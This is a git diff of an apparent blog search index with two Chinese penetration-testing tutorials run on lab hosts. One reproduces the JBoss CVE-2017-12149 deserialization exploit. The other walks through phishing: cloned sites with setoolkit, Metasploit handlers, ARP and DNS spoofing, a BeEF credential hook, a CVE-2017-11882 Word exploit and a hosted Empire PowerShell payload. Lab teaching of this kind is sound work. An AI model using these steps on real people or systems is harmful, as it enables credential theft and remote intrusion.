@@ -3,10 +3,41 @@
   
     
     <entry>
+      <title><![CDATA[JOBSS反序列化漏洞复现]]></title>
+      <url>/2017/12/27/JBOSS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+      <content type="html"><![CDATA[<h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00. 漏洞描述"></a>0x00. 漏洞描述</h2><h3 id="2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS-Application-Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。"><a href="#2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS-Application-Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。" class="headerlink" title="2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS Application Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。"></a>2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS Application Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。</h3><a id="more"></a>
+<h2 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01. 漏洞复现"></a>0x01. 漏洞复现</h2><h3 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1). 环境准备"></a>1). 环境准备</h3><h4 id="1-JBOSS下载地址：http-download-jboss-org-jbossas-6-1-jboss-as-distribution-6-1-0-Final-zip"><a href="#1-JBOSS下载地址：http-download-jboss-org-jbossas-6-1-jboss-as-distribution-6-1-0-Final-zip" class="headerlink" title="1. JBOSS下载地址：http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip"></a>1. JBOSS下载地址：<a href="http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip" target="_blank" rel="external">http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip</a></h4><h4 id="2-EXP下载地址：https-github-com-yunxu1-jboss-CVE-2017-12149"><a href="#2-EXP下载地址：https-github-com-yunxu1-jboss-CVE-2017-12149" class="headerlink" title="2. EXP下载地址：https://github.com/yunxu1/jboss-_CVE-2017-12149"></a>2. EXP下载地址：<a href="https://github.com/yunxu1/jboss-_CVE-2017-12149" target="_blank" rel="external">https://github.com/yunxu1/jboss-_CVE-2017-12149</a></h4><h3 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2). 环境搭建"></a>2). 环境搭建</h3><h4 id="第一步：下载JBOSS环境，并解压"><a href="#第一步：下载JBOSS环境，并解压" class="headerlink" title="第一步：下载JBOSS环境，并解压"></a>第一步：下载JBOSS环境，并解压</h4><blockquote>
+<p>wget <a href="http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip" target="_blank" rel="external">http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip</a> </p>
+</blockquote>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227180801_LeUN0c_6293.jpeg" alt=""></p>
+<h4 id="第二步：修改配置文件，使网络中的主机都能访问JBOSS"><a href="#第二步：修改配置文件，使网络中的主机都能访问JBOSS" class="headerlink" title="第二步：修改配置文件，使网络中的主机都能访问JBOSS"></a>第二步：修改配置文件，使网络中的主机都能访问JBOSS</h4><blockquote>
+<p>vim ~/jboss-6.1.0.Final/server/default/deploy/jbossweb.sar/server.xml</p>
+</blockquote>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227180817_sOlp2c_6301.jpeg" alt=""></p>
+<h4 id="第三步：启动JBOSS"><a href="#第三步：启动JBOSS" class="headerlink" title="第三步：启动JBOSS"></a>第三步：启动JBOSS</h4><blockquote>
+<p>./jboss-6.1.0.Final/bin/run.sh</p>
+</blockquote>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227180832_WE4CD3_6309.jpeg" alt=""></p>
+<h4 id="第四步：下载EXP"><a href="#第四步：下载EXP" class="headerlink" title="第四步：下载EXP"></a>第四步：下载EXP</h4><blockquote>
+<p>git clone <a href="https://github.com/yunxu1/jboss-_CVE-2017-12149" target="_blank" rel="external">https://github.com/yunxu1/jboss-_CVE-2017-12149</a></p>
+</blockquote>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227180843_FQh3jJ_6316.jpeg" alt=""></p>
+<h3 id="3-信息收集"><a href="#3-信息收集" class="headerlink" title="3). 信息收集"></a>3). 信息收集</h3><h4 id="第一步：利用nmap对目标主机进行常用端口扫描"><a href="#第一步：利用nmap对目标主机进行常用端口扫描" class="headerlink" title="第一步：利用nmap对目标主机进行常用端口扫描"></a>第一步：利用nmap对目标主机进行常用端口扫描</h4><blockquote>
+<p>nmap 192.168.1.111 -A </p>
+</blockquote>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227180855_12YJ7L_6329.jpeg" alt=""></p>
+<h4 id="第二步：访问目标主机的8080端口，看看能否正常访问"><a href="#第二步：访问目标主机的8080端口，看看能否正常访问" class="headerlink" title="第二步：访问目标主机的8080端口，看看能否正常访问"></a>第二步：访问目标主机的8080端口，看看能否正常访问</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227180912_UQjhJU_6322.jpeg" alt=""></p>
+<h3 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4). 漏洞利用"></a>4). 漏洞利用</h3><h4 id="利用刚才下载好的EXP进行漏洞利用，打开jboss反序列化-CVE-2017-12149-jar"><a href="#利用刚才下载好的EXP进行漏洞利用，打开jboss反序列化-CVE-2017-12149-jar" class="headerlink" title="利用刚才下载好的EXP进行漏洞利用，打开jboss反序列化_CVE-2017-12149.jar"></a>利用刚才下载好的EXP进行漏洞利用，打开jboss反序列化_CVE-2017-12149.jar</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227180923_jatTku_6333.jpeg" alt=""></p>
+<h2 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02. 总结"></a>0x02. 总结</h2><h3 id="emsp-emsp-行千里路，不如读万卷书…"><a href="#emsp-emsp-行千里路，不如读万卷书…" class="headerlink" title="&emsp;&emsp;行千里路，不如读万卷书…"></a>&emsp;&emsp;行千里路，不如读万卷书…</h3>]]></content>
+      
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[花式钓鱼法]]></title>
       <url>/2017/12/27/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/</url>
-      <content type="html"><![CDATA[<h2 id="0x00-闲谈"><a href="#0x00-闲谈" class="headerlink" title="0x00. 闲谈"></a>0x00. 闲谈</h2><h4 id="emsp-emsp-最近我们小组招新群里居然有人利用邮箱群发功能进行社工钓鱼，最奇葩的是居然还有人中招了，是可忍孰不可忍，千钧一发之际正当我准备祭出珍藏已久的Nmap打算搞死幕后黑手的时候，他她它居然把服务器关了，看来还是有准备的。如果不是没有酿成严重后果，我们绝对不会善罢甘休，光他暴露的IP就足够我们溯源追踪了，下面我也来给大家演示一下如何钓鱼和预防钓鱼陷阱。"><a href="#emsp-emsp-最近我们小组招新群里居然有人利用邮箱群发功能进行社工钓鱼，最奇葩的是居然还有人中招了，是可忍孰不可忍，千钧一发之际正当我准备祭出珍藏已久的Nmap打算搞死幕后黑手的时候，他她它居然把服务器关了，看来还是有准备的。如果不是没有酿成严重后果，我们绝对不会善罢甘休，光他暴露的IP就足够我们溯源追踪了，下面我也来给大家演示一下如何钓鱼和预防钓鱼陷阱。" class="headerlink" title="&emsp;&emsp;最近我们小组招新群里居然有人利用邮箱群发功能进行社工钓鱼，最奇葩的是居然还有人中招了，是可忍孰不可忍，千钧一发之际正当我准备祭出珍藏已久的Nmap打算搞死幕后黑手的时候，他她它居然把服务器关了，看来还是有准备的。如果不是没有酿成严重后果，我们绝对不会善罢甘休，光他暴露的IP就足够我们溯源追踪了，下面我也来给大家演示一下如何钓鱼和预防钓鱼陷阱。"></a>&emsp;&emsp;最近我们小组招新群里居然有人利用邮箱群发功能进行社工钓鱼，最奇葩的是居然还有人中招了，是可忍孰不可忍，千钧一发之际正当我准备祭出珍藏已久的Nmap打算搞死幕后黑手的时候，他她它居然把服务器关了，看来还是有准备的。如果不是没有酿成严重后果，我们绝对不会善罢甘休，光他暴露的IP就足够我们溯源追踪了，下面我也来给大家演示一下如何钓鱼和预防钓鱼陷阱。</h4><a id="more"></a>
-<p><img src="https://note.youdao.com/yws/public/resource/9b5fd3963fef1483bdee9b0e9825bcd6/xmlnote/125C8756A5BA4BD3BCB957DE4C37E4A1/6191" alt="image"></p>
+      <content type="html"><![CDATA[<h2 id="0x00-闲谈"><a href="#0x00-闲谈" class="headerlink" title="0x00. 闲谈"></a>0x00. 闲谈</h2><h3 id="emsp-emsp-最近我们小组招新群里居然有人利用邮箱群发功能进行社工钓鱼，最奇葩的是居然还有人中招了，是可忍孰不可忍，千钧一发之际正当我准备祭出珍藏已久的Nmap打算搞死幕后黑手的时候，他她它居然把服务器关了，看来还是有准备的。如果不是没有酿成严重后果，我们绝对不会善罢甘休，光他暴露的IP就足够我们溯源追踪了，下面我也来给大家演示一下如何钓鱼和预防钓鱼陷阱。"><a href="#emsp-emsp-最近我们小组招新群里居然有人利用邮箱群发功能进行社工钓鱼，最奇葩的是居然还有人中招了，是可忍孰不可忍，千钧一发之际正当我准备祭出珍藏已久的Nmap打算搞死幕后黑手的时候，他她它居然把服务器关了，看来还是有准备的。如果不是没有酿成严重后果，我们绝对不会善罢甘休，光他暴露的IP就足够我们溯源追踪了，下面我也来给大家演示一下如何钓鱼和预防钓鱼陷阱。" class="headerlink" title="&emsp;&emsp;最近我们小组招新群里居然有人利用邮箱群发功能进行社工钓鱼，最奇葩的是居然还有人中招了，是可忍孰不可忍，千钧一发之际正当我准备祭出珍藏已久的Nmap打算搞死幕后黑手的时候，他她它居然把服务器关了，看来还是有准备的。如果不是没有酿成严重后果，我们绝对不会善罢甘休，光他暴露的IP就足够我们溯源追踪了，下面我也来给大家演示一下如何钓鱼和预防钓鱼陷阱。"></a>&emsp;&emsp;最近我们小组招新群里居然有人利用邮箱群发功能进行社工钓鱼，最奇葩的是居然还有人中招了，是可忍孰不可忍，千钧一发之际正当我准备祭出珍藏已久的Nmap打算搞死幕后黑手的时候，他她它居然把服务器关了，看来还是有准备的。如果不是没有酿成严重后果，我们绝对不会善罢甘休，光他暴露的IP就足够我们溯源追踪了，下面我也来给大家演示一下如何钓鱼和预防钓鱼陷阱。</h3><a id="more"></a>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182440_peGRkR_6191.jpeg" alt=""></p>
 <h2 id="0x01-环境配置"><a href="#0x01-环境配置" class="headerlink" title="0x01. 环境配置"></a>0x01. 环境配置</h2><h3 id="1-环境准备："><a href="#1-环境准备：" class="headerlink" title="1). 环境准备："></a>1). 环境准备：</h3><h3 id="1-kali-linux（dnsspoof、arpspoof、setookit、metersploit、beef、Empire）"><a href="#1-kali-linux（dnsspoof、arpspoof、setookit、metersploit、beef、Empire）" class="headerlink" title="1. kali linux（dnsspoof、arpspoof、setookit、metersploit、beef、Empire）"></a>1. kali linux（dnsspoof、arpspoof、setookit、metersploit、beef、Empire）</h3><h3 id="2-windows-xp"><a href="#2-windows-xp" class="headerlink" title="2. windows xp"></a>2. windows xp</h3><h3 id="3-window-7"><a href="#3-window-7" class="headerlink" title="3. window 7"></a>3. window 7</h3><h1 id="情景一："><a href="#情景一：" class="headerlink" title="情景一："></a>情景一：</h1><blockquote>
 <p>利用Java Applet 进行钓鱼，不过现在的浏览器已经开始禁止这些插件了，要利用这种情景最好先做好前期的信息收集，判断目标是否支持Java Applet</p>
 </blockquote>
@@ -16,20 +47,20 @@
 <h4 id="第二步：配置JAVA-REAPETER-ON-让基于Java-Applet-的警告窗不停的弹出，使攻击更容易成功"><a href="#第二步：配置JAVA-REAPETER-ON-让基于Java-Applet-的警告窗不停的弹出，使攻击更容易成功" class="headerlink" title="第二步：配置JAVA REAPETER = ON 让基于Java Applet 的警告窗不停的弹出，使攻击更容易成功"></a>第二步：配置JAVA REAPETER = ON 让基于Java Applet 的警告窗不停的弹出，使攻击更容易成功</h4><blockquote>
 <p>vim /etc/setoolkit/set.config</p>
 </blockquote>
-<p><img src="https://note.youdao.com/yws/public/resource/9b5fd3963fef1483bdee9b0e9825bcd6/xmlnote/8EAC9F865C004322B4FE1C7B7ACFBB34/6241" alt="image"></p>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182513_m24bV3_6241.jpeg" alt=""></p>
 <h4 id="第三步：启动setookit-构造钓鱼页面，成功启动之后会建立一个监听"><a href="#第三步：启动setookit-构造钓鱼页面，成功启动之后会建立一个监听" class="headerlink" title="第三步：启动setookit 构造钓鱼页面，成功启动之后会建立一个监听"></a>第三步：启动setookit 构造钓鱼页面，成功启动之后会建立一个监听</h4><blockquote>
 <p>setookit</p>
 <p>依次按照如下顺序：1&emsp;2&emsp;1&emsp;2&emsp;no&emsp;回车&emsp;2&emsp;www.baidu.com&emsp;1&emsp;443&emsp;1 </p>
 </blockquote>
-<p><img src="https://note.youdao.com/yws/public/resource/9b5fd3963fef1483bdee9b0e9825bcd6/xmlnote/8A51D5C1728E45C5B5AB46C3B51731C3/6258" alt="image"></p>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182524_72fK5L_6258.jpeg" alt=""></p>
 <h4 id="第四步：配置metasploit-设置自动迁移进程，避免钓鱼网站被关导致连接中断，同时设置持续监听"><a href="#第四步：配置metasploit-设置自动迁移进程，避免钓鱼网站被关导致连接中断，同时设置持续监听" class="headerlink" title="第四步：配置metasploit 设置自动迁移进程，避免钓鱼网站被关导致连接中断，同时设置持续监听"></a>第四步：配置metasploit 设置自动迁移进程，避免钓鱼网站被关导致连接中断，同时设置持续监听</h4><blockquote>
 <p>kill 0</p>
 <p>set exitonsession false</p>
 <p>set autorunscript migrate -f</p>
 <p>run -j</p>
 </blockquote>
-<p><img src="https://note.youdao.com/yws/public/resource/9b5fd3963fef1483bdee9b0e9825bcd6/xmlnote/205A825368024817A868A51DA93D6366/6268" alt="image"></p>
-<h4 id="第五步：钓鱼网址已经上线，只等鱼儿上钩了（笔者的浏览器也不支持Java-Applet-所以看不到具体效果，不过克隆的百度除了域名外其他都是一模一样的）"><a href="#第五步：钓鱼网址已经上线，只等鱼儿上钩了（笔者的浏览器也不支持Java-Applet-所以看不到具体效果，不过克隆的百度除了域名外其他都是一模一样的）" class="headerlink" title="第五步：钓鱼网址已经上线，只等鱼儿上钩了（笔者的浏览器也不支持Java Applet 所以看不到具体效果，不过克隆的百度除了域名外其他都是一模一样的）"></a>第五步：钓鱼网址已经上线，只等鱼儿上钩了（笔者的浏览器也不支持Java Applet 所以看不到具体效果，不过克隆的百度除了域名外其他都是一模一样的）</h4><p><img src="https://note.youdao.com/yws/public/resource/9b5fd3963fef1483bdee9b0e9825bcd6/xmlnote/947B62D0DDEA406B9444A34257E4A65C/6356" alt="image"></p>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182535_47xLHO_6268.jpeg" alt=""></p>
+<h4 id="第五步：钓鱼网址已经上线，只等鱼儿上钩了（笔者的浏览器也不支持Java-Applet-所以看不到具体效果，不过克隆的百度除了域名外其他都是一模一样的）"><a href="#第五步：钓鱼网址已经上线，只等鱼儿上钩了（笔者的浏览器也不支持Java-Applet-所以看不到具体效果，不过克隆的百度除了域名外其他都是一模一样的）" class="headerlink" title="第五步：钓鱼网址已经上线，只等鱼儿上钩了（笔者的浏览器也不支持Java Applet 所以看不到具体效果，不过克隆的百度除了域名外其他都是一模一样的）"></a>第五步：钓鱼网址已经上线，只等鱼儿上钩了（笔者的浏览器也不支持Java Applet 所以看不到具体效果，不过克隆的百度除了域名外其他都是一模一样的）</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182544_uI1YdI_6356.jpeg" alt=""></p>
 <hr>
 <h1 id="情景二："><a href="#情景二：" class="headerlink" title="情景二："></a>情景二：</h1><blockquote>
 <p>利用浏览器漏洞和中间人攻击进行钓鱼，不过这个漏洞已经比较老了，笔者只在xp上成功过，不过这里提供一种思路，万一哪天IE又抽风来个CVE…</p>
@@ -38,7 +69,7 @@
 <p>setookit </p>
 <p>依次按照如下顺序：1&emsp;2&emsp;2&emsp;1&emsp;no&emsp;回车&emsp;5&emsp;37&emsp;2&emsp;443</p>
 </blockquote>
-<p><img src="https://note.youdao.com/yws/public/resource/9b5fd3963fef1483bdee9b0e9825bcd6/xmlnote/DFC2FC6A2AE94828BD374DB19DE5016A/6381" alt="image"></p>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182556_R3oubQ_6381.jpeg" alt=""></p>
 <h4 id="第二步：默认会使用本地的8080端口，但这并不是我们所期望的。kill掉此时的job重新启动一个"><a href="#第二步：默认会使用本地的8080端口，但这并不是我们所期望的。kill掉此时的job重新启动一个" class="headerlink" title="第二步：默认会使用本地的8080端口，但这并不是我们所期望的。kill掉此时的job重新启动一个"></a>第二步：默认会使用本地的8080端口，但这并不是我们所期望的。kill掉此时的job重新启动一个</h4><blockquote>
 <p>kill 0</p>
 <p>set srvport 80</p>
@@ -46,14 +77,14 @@
 <p>set autorunscript migrate -f</p>
 <p>run -j</p>
 </blockquote>
-<p><img src="https://note.youdao.com/yws/public/resource/9b5fd3963fef1483bdee9b0e9825bcd6/xmlnote/CE7BAE2C841A46F3A0B3DE4D5FD70FCE/6390" alt="image"></p>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182608_ZogrCp_6390.jpeg" alt=""></p>
 <h4 id="第三步：此时可以直接将网址甩给目标，但是别人不一定会点开啊。于是我准备利用中间人攻击加DNS投毒强行让目标打开我们构造钓鱼页面，就是这么霸道-o-，原理大家可以参考我这篇文章"><a href="#第三步：此时可以直接将网址甩给目标，但是别人不一定会点开啊。于是我准备利用中间人攻击加DNS投毒强行让目标打开我们构造钓鱼页面，就是这么霸道-o-，原理大家可以参考我这篇文章" class="headerlink" title="第三步：此时可以直接将网址甩给目标，但是别人不一定会点开啊。于是我准备利用中间人攻击加DNS投毒强行让目标打开我们构造钓鱼页面，就是这么霸道\^o^，原理大家可以参考我这篇文章"></a>第三步：此时可以直接将网址甩给目标，但是别人不一定会点开啊。于是我准备利用中间人攻击加DNS投毒强行让目标打开我们构造钓鱼页面，就是这么霸道\^o^，原理大家可以参考我这篇<a href="https://times0ng.github.io/2017/10/02/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F-%E5%BA%8F%E7%AB%A0-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/">文章</a></h4><blockquote>
 <p>echo 1 &gt; /proc/sys/net/ipv4/ip_forward &amp;&amp; arpspoof -t 192.168.1.110 -r 192.168.1.1</p>
 <p>echo “192.168.1.111 *.wmpic.me” &gt; dnsspoof.host &amp;&amp; dnsspoof -i eth0 -f dnsspoof.host</p>
 <p>[*]进行DNS投毒时经常会失败，笔者对这种情况也有点不解，不过当我用xp的IE浏览器访问<a href="http://hack.wmpic.me时还是成功被重定向到我们构造的http://192.168.1.111页面，msf成功getshell" target="_blank" rel="external">http://hack.wmpic.me时还是成功被重定向到我们构造的http://192.168.1.111页面，msf成功getshell</a></p>
 </blockquote>
-<p><img src="https://note.youdao.com/yws/public/resource/9b5fd3963fef1483bdee9b0e9825bcd6/xmlnote/ADFC85823F8E498EA7B2734AAFF548B2/6403" alt="image"></p>
-<p><img src="https://note.youdao.com/yws/public/resource/9b5fd3963fef1483bdee9b0e9825bcd6/xmlnote/43EF5A2744A04621B3D60B277FA224C4/6410" alt="image"></p>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182624_rBdD7y_6403.jpeg" alt=""></p>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182639_NQ1Zpz_6410.jpeg" alt=""></p>
 <hr>
 <h1 id="情景三："><a href="#情景三：" class="headerlink" title="情景三："></a>情景三：</h1><blockquote>
 <p>钓鱼页面与beef结合，让鱼儿无处可逃</p>
@@ -62,16 +93,16 @@
 <p>setookit</p>
 <p>依次按照如下顺序：1&emsp;2&emsp;3&emsp;1&emsp;local IP(192.168.1.111)&emsp;5</p>
 </blockquote>
-<p><img src="https://note.youdao.com/yws/public/resource/9b5fd3963fef1483bdee9b0e9825bcd6/xmlnote/E6501C7CDC4A4731AF11817210A0CD0E/6432" alt="image"></p>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182652_6jCVOg_6432.jpeg" alt=""></p>
 <h4 id="第二步：启动beef，将HOOK代码嵌入钓鱼页面"><a href="#第二步：启动beef，将HOOK代码嵌入钓鱼页面" class="headerlink" title="第二步：启动beef，将HOOK代码嵌入钓鱼页面"></a>第二步：启动beef，将HOOK代码嵌入钓鱼页面</h4><blockquote>
 <p>vim ~/.set/web_clone/index.html</p>
 </blockquote>
-<p><img src="https://note.youdao.com/yws/public/resource/9b5fd3963fef1483bdee9b0e9825bcd6/xmlnote/95F3C726BD10477389C00F934E39641D/6441" alt="image"></p>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182704_1tJrZ6_6441.jpeg" alt=""></p>
 <h4 id="第四步：通过社工让鱼儿访问我们的钓鱼页面，如果鱼儿输入账号密码就会将它们发送到我们的kali上"><a href="#第四步：通过社工让鱼儿访问我们的钓鱼页面，如果鱼儿输入账号密码就会将它们发送到我们的kali上" class="headerlink" title="第四步：通过社工让鱼儿访问我们的钓鱼页面，如果鱼儿输入账号密码就会将它们发送到我们的kali上"></a>第四步：通过社工让鱼儿访问我们的钓鱼页面，如果鱼儿输入账号密码就会将它们发送到我们的kali上</h4><blockquote>
 <p><a href="http://192.168.1.111" target="_blank" rel="external">http://192.168.1.111</a></p>
 </blockquote>
-<p><img src="https://note.youdao.com/yws/public/resource/9b5fd3963fef1483bdee9b0e9825bcd6/xmlnote/DD92761A5B9C421D9BC9A6A82F11146E/6448" alt="image"></p>
-<h4 id="第五步：回到kali查看效果，可以看到beef已经收到回连，后续阶段大家自己”意淫”吧！"><a href="#第五步：回到kali查看效果，可以看到beef已经收到回连，后续阶段大家自己”意淫”吧！" class="headerlink" title="第五步：回到kali查看效果，可以看到beef已经收到回连，后续阶段大家自己”意淫”吧！"></a>第五步：回到kali查看效果，可以看到beef已经收到回连，后续阶段大家自己”意淫”吧！</h4><p><img src="https://note.youdao.com/yws/public/resource/9b5fd3963fef1483bdee9b0e9825bcd6/xmlnote/7A6CADBE53DA4FB6A0DDD8FF876B9E36/6451" alt="image"></p>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182719_DRT0dh_6448.jpeg" alt=""></p>
+<h4 id="第五步：回到kali查看效果，可以看到beef已经收到回连，后续阶段大家自己”意淫”吧！"><a href="#第五步：回到kali查看效果，可以看到beef已经收到回连，后续阶段大家自己”意淫”吧！" class="headerlink" title="第五步：回到kali查看效果，可以看到beef已经收到回连，后续阶段大家自己”意淫”吧！"></a>第五步：回到kali查看效果，可以看到beef已经收到回连，后续阶段大家自己”意淫”吧！</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182731_rP5b4s_6451.jpeg" alt=""></p>
 <hr>
 <h1 id="情景四："><a href="#情景四：" class="headerlink" title="情景四："></a>情景四：</h1><blockquote>
 <p> 利用最新的word漏洞CVE-2017-11882钓鱼</p>
@@ -80,14 +111,14 @@
 <p>wget <a href="https://raw.githubusercontent.com/realoriginal/metasploit-framework/39a4d193a17c6f85846a58a429c0914f542bded2/modules/exploits/windows/fileformat/office_ms17_11882.rb" target="_blank" rel="external">https://raw.githubusercontent.com/realoriginal/metasploit-framework/39a4d193a17c6f85846a58a429c0914f542bded2/modules/exploits/windows/fileformat/office_ms17_11882.rb</a></p>
 <p>mv office_ms17_11882.rb /usr/share/metasploit-framework/modules/exploits/windows/fileformat</p>
 </blockquote>
-<p><img src="https://note.youdao.com/yws/public/resource/9b5fd3963fef1483bdee9b0e9825bcd6/xmlnote/F049C0DB3A574262A06FCBEC0EA6BC38/6464" alt="image"></p>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182749_4NZ76L_6464.jpeg" alt=""></p>
 <h4 id="第二步：启动msf生成钓鱼word"><a href="#第二步：启动msf生成钓鱼word" class="headerlink" title="第二步：启动msf生成钓鱼word"></a>第二步：启动msf生成钓鱼word</h4><blockquote>
 <p>reload_all</p>
 <p>use exploit/windows/fileformat/office_ms17_11882</p>
 </blockquote>
-<p><img src="https://note.youdao.com/yws/public/resource/9b5fd3963fef1483bdee9b0e9825bcd6/xmlnote/48184CC820BC444E8AFD22FB5320BEA7/6474" alt="image"></p>
-<h4 id="第三步：此时可以将girlfriend-word直接发送给鱼儿，也可以发送网址，让他们自己下载，不过msf提供的web-server不太好用，下载的文件没有扩展名。我们也可以自己搭建web-server，我比较懒就直接将word拖到win-7上去了"><a href="#第三步：此时可以将girlfriend-word直接发送给鱼儿，也可以发送网址，让他们自己下载，不过msf提供的web-server不太好用，下载的文件没有扩展名。我们也可以自己搭建web-server，我比较懒就直接将word拖到win-7上去了" class="headerlink" title="第三步：此时可以将girlfriend.word直接发送给鱼儿，也可以发送网址，让他们自己下载，不过msf提供的web server不太好用，下载的文件没有扩展名。我们也可以自己搭建web server，我比较懒就直接将word拖到win 7上去了"></a>第三步：此时可以将girlfriend.word直接发送给鱼儿，也可以发送网址，让他们自己下载，不过msf提供的web server不太好用，下载的文件没有扩展名。我们也可以自己搭建web server，我比较懒就直接将word拖到win 7上去了</h4><p><img src="https://note.youdao.com/yws/public/resource/9b5fd3963fef1483bdee9b0e9825bcd6/xmlnote/32D4236163024A6A929A6AF611C59C93/6481" alt="image"></p>
-<p><img src="https://note.youdao.com/yws/public/resource/9b5fd3963fef1483bdee9b0e9825bcd6/xmlnote/918FE54E682F4E5EBC618CEAF07B5B47/6483" alt="image"></p>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182803_yEBCcc_6474.jpeg" alt=""></p>
+<h4 id="第三步：此时可以将girlfriend-word直接发送给鱼儿，也可以发送网址，让他们自己下载，不过msf提供的web-server不太好用，下载的文件没有扩展名。我们也可以自己搭建web-server，我比较懒就直接将word拖到win-7上去了"><a href="#第三步：此时可以将girlfriend-word直接发送给鱼儿，也可以发送网址，让他们自己下载，不过msf提供的web-server不太好用，下载的文件没有扩展名。我们也可以自己搭建web-server，我比较懒就直接将word拖到win-7上去了" class="headerlink" title="第三步：此时可以将girlfriend.word直接发送给鱼儿，也可以发送网址，让他们自己下载，不过msf提供的web server不太好用，下载的文件没有扩展名。我们也可以自己搭建web server，我比较懒就直接将word拖到win 7上去了"></a>第三步：此时可以将girlfriend.word直接发送给鱼儿，也可以发送网址，让他们自己下载，不过msf提供的web server不太好用，下载的文件没有扩展名。我们也可以自己搭建web server，我比较懒就直接将word拖到win 7上去了</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227182814_BxOTQF_6481.jpeg" alt=""></p>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182825_2n8D2X_6483.jpeg" alt=""></p>
 <hr>
 <h1 id="情景五："><a href="#情景五：" class="headerlink" title="情景五："></a>情景五：</h1><blockquote>
 <p>利用windows自带的powershell进行钓鱼，即发送bat文件，并将payload放到远程服务器，这样在一定程度上可以绕过杀软</p>
@@ -98,7 +129,7 @@
 <h4 id="第二步：启动Empire生成payload"><a href="#第二步：启动Empire生成payload" class="headerlink" title="第二步：启动Empire生成payload"></a>第二步：启动Empire生成payload</h4><blockquote>
 <p>launcher powershell times0ng</p>
 </blockquote>
-<p><img src="https://note.youdao.com/yws/public/resource/9b5fd3963fef1483bdee9b0e9825bcd6/xmlnote/BBC5E62E286D44EBBCC6C22494830134/6547" alt="image"></p>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com/%E8%8A%B1%E5%BC%8F%E9%92%93%E9%B1%BC%E6%B3%95/20171227182834_3NraFH_6547.jpeg" alt=""></p>
 <h4 id="第三步：启动Apache2，并将payload源码放到根目录的empire-psl文件中"><a href="#第三步：启动Apache2，并将payload源码放到根目录的empire-psl文件中" class="headerlink" title="第三步：启动Apache2，并将payload源码放到根目录的empire.psl文件中"></a>第三步：启动Apache2，并将payload源码放到根目录的empire.psl文件中</h4><blockquote>
 <p>service apache2 start</p>
 <p>vim /var/www/html/empire.psl</p>
@@ -106,8 +137,8 @@
